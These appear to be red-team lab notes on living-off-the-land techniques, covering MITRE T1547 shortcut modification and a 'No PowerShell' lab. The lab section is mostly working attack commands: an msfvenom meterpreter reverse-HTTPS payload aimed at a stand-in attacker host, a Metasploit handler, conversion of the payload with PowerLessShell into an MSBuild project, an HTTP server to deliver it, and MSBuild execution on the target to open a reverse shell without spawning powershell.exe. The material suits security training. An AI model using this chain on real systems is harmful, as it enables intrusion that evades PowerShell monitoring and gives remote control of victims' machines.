# Other techniques

## Shortcuts

Shortcuts or symbolic links are a technique used for referring to other files or applications within the OS. Once a 
user clicks on the shortcut file, the reference file or application is executed. Often, the Red team leverages this 
technique to gain initial access, privilege escalation, or persistence. The MITRE ATT&CK framework calls this 
"Shortcut modification" technique ([T1547](https://attack.mitre.org/techniques/T1547/009/)).

To use the shortcut modification technique, we can set the target section to execute files using:

* Rundll32
* Powershell
* Regsvr32
* Executable on disk

## No PowerShell Lab

In 2019, Red Canary published a threat detection report stating that PowerShell is the most used technique for 
malicious activities. Therefore, Organisations started to monitor or block `powershell.exe` from being executed. As a 
result, adversaries find other ways to run PowerShell code without spawning it.

PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an 
instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a 
platform for building Windows applications, to execute remote code.

```text
$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
```

Generate a PowerShell payload:

```text
$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4444  -f psh-reflection > liv0ff.ps1
```

Run the Metasploit framework to listen and wait for the reverse shell:

```text
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4444 ;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_winhttps
lhost => AttackBox_IP lport => 4444 
[*] Started HTTPS reverse handler on https://AttackBox_IP:4444 
```

Change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool. Then run 
the PowerLessShell tool and set the source file to the one created with msfvenom:

```text
$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
```

Transfer the output file to the target machine with `scp` or setting a web server to host the file on the attacking
machine and downloading the file using a browser.

```text
$ python3 -m http.server 1337
```

On the target machine, build the `.csproj` file and wait for the reverse shell:

```text
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```



## Resources

* [theonlykernel/atomic-red-team](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)

